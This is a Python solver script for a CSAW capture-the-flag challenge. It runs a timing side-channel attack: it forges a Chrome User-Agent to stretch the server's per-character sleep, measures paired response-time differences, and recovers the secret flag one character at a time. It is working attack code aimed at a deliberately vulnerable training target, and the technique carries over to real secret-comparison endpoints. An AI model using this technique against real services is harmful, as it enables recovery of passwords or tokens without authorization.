#!/usr/bin/env python3
"""CSAW CTF 2026 — Flag Checker (23) timing oracle.

bot_check copies Chrome/X.0.BUILD.PATCH into reqmeta._store. Flag.__eq__
sleeps once per compared character, scaled by min(build*patch, 1e6).

Two implementation details that break naive scanners:

1. Length is checked *before* sleep; the character compare is *after*.
   A guess the same length as the known prefix cannot distinguish a
   correct next character from a wrong one. Always append a sentinel.
2. Flask is single-threaded. Absolute times drift; score the paired
   difference T(prefix+c+sentinel) - T(prefix+sentinel).

Final equality checks use build=patch=1 so they do not sleep.
"""
from __future__ import annotations

import argparse
import json
import statistics
import sys
import time
import urllib.parse
from http.client import HTTPConnection
from pathlib import Path

SENTINEL = "|"
ALPHABET = "etaoinshrdlucmfwypvbgkjqxz0123456789_}"
PRIORITY = "n_0e}o1a"  # common continuation after a recovered word


def chrome_ua(build: int, patch: int) -> str:
    return (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        f"(KHTML, like Gecko) Chrome/120.0.{build}.{patch} Safari/537.36"
    )


class Oracle:
    def __init__(self, host: str, port: int, build: int, patch: int):
        self.host, self.port = host, port
        self.build, self.patch = build, patch
        self.conn: HTTPConnection | None = None
        self._connect()

    def _connect(self) -> None:
        if self.conn is not None:
            try:
                self.conn.close()
            except Exception:
                pass
        self.conn = HTTPConnection(self.host, self.port, timeout=90)
        self.conn.connect()

    def query(self, guess: str, build: int | None = None, patch: int | None = None) -> tuple[float, str]:
        b = self.build if build is None else build
        p = self.patch if patch is None else patch
        body = urllib.parse.urlencode({"flag": guess}).encode()
        headers = {
            "User-Agent": chrome_ua(b, p),
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive",
            "Content-Length": str(len(body)),
        }
        last: Exception | None = None
        for i in range(5):
            try:
                t0 = time.perf_counter()
                assert self.conn is not None
                self.conn.request("POST", "/check", body, headers)
                resp = self.conn.getresponse()
                data = resp.read().decode("utf-8", "replace")
                return (time.perf_counter() - t0) * 1000.0, data
            except Exception as e:
                last = e
                time.sleep(0.4 * (i + 1))
                self._connect()
        raise RuntimeError(last)


def is_correct(body: str) -> bool:
    try:
        return bool(json.loads(body).get("correct"))
    except Exception:
        return False


def paired_delta(orcl: Oracle, prefix: str, c: str, n: int) -> float:
    ds = []
    for _ in range(n):
        a, _ = orcl.query(prefix + c + SENTINEL)
        b, _ = orcl.query(prefix + SENTINEL)
        ds.append(a - b)
    return float(statistics.median(ds))


def calibrate(orcl: Oracle, known: str = "csaw{") -> float:
    steps = []
    for n in range(min(len(known), 5)):
        xs = [orcl.query(known[:n] + SENTINEL)[0] for _ in range(2)]
        steps.append(statistics.median(xs))
        print(f"  calib match={n} {steps[-1]:.0f} ms", flush=True)
    deltas = [steps[i] - steps[i - 1] for i in range(1, len(steps))]
    per = float(statistics.median(deltas)) if deltas else 150.0
    print(f"  per-char ≈ {per:.1f} ms  deltas={[round(d) for d in deltas]}", flush=True)
    return per


def recover(orcl: Oracle, prefix: str, per: float, state: Path) -> str:
    while len(prefix) < 80:
        _, body = orcl.query(prefix, build=1, patch=1)
        if is_correct(body):
            return prefix
        print(f"\n[{len(prefix)}] {prefix!r}", flush=True)
        seen: set[str] = set()
        alphabet = []
        for c in PRIORITY + ALPHABET:
            if c not in seen:
                seen.add(c)
                alphabet.append(c)
        committed = None
        best_c, best_d = None, -1e9
        for c in alphabet:
            d = paired_delta(orcl, prefix, c, n=2)
            print(f"  {c!r} d={d:+.0f}", flush=True)
            if d > best_d:
                best_d, best_c = d, c
            if d > 0.8 * per:
                d2 = paired_delta(orcl, prefix, c, n=2)
                print(f"  confirm {c!r} d2={d2:+.0f}", flush=True)
                if d2 > 0.6 * per:
                    committed = c
                    break
        if committed is None:
            if best_c is None or best_d < 0.5 * per:
                raise SystemExit(f"ambiguous at {prefix!r} best={best_c!r} d={best_d:.0f}")
            committed = best_c
            print(f"  weak-commit {committed!r} d={best_d:.0f}", flush=True)
        prefix += committed
        state.write_text(json.dumps({"prefix": prefix, "per_ms": per}))
        print(f"  committed {prefix!r}", flush=True)
        _, body = orcl.query(prefix, build=1, patch=1)
        if is_correct(body):
            return prefix
        if committed == "}":
            _, body = orcl.query(prefix, build=1, patch=1)
            if is_correct(body):
                return prefix
    return prefix


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--build", type=int, default=800)
    ap.add_argument("--patch", type=int, default=800)
    ap.add_argument("--prefix", default="csaw{")
    ap.add_argument("--per", type=float, default=0.0)
    ap.add_argument("--state", default=str(Path(__file__).with_name("progress.json")))
    args = ap.parse_args()

    state = Path(args.state)
    prefix = args.prefix
    if state.exists():
        try:
            st = json.loads(state.read_text())
            if isinstance(st.get("prefix"), str) and st["prefix"].startswith("csaw"):
                prefix = st["prefix"]
        except Exception:
            pass

    print(f"[*] {args.host}:{args.port} Chrome/120.0.{args.build}.{args.patch} prefix={prefix!r}", flush=True)
    orcl = Oracle(args.host, args.port, args.build, args.patch)
    warm, body = orcl.query("Z")
    print(f"[*] warmup {warm:.0f} ms {body!r}", flush=True)
    if "Access denied" in body:
        print("[-] bot_check rejected UA", file=sys.stderr)
        return 2

    per = args.per if args.per > 0 else calibrate(orcl)
    flag = recover(orcl, prefix, per, state)
    _, body = orcl.query(flag, build=1, patch=1)
    print(f"RESULT {flag}  verify={body.strip()}", flush=True)
    return 0 if is_correct(body) else 1


if __name__ == "__main__":
    raise SystemExit(main())
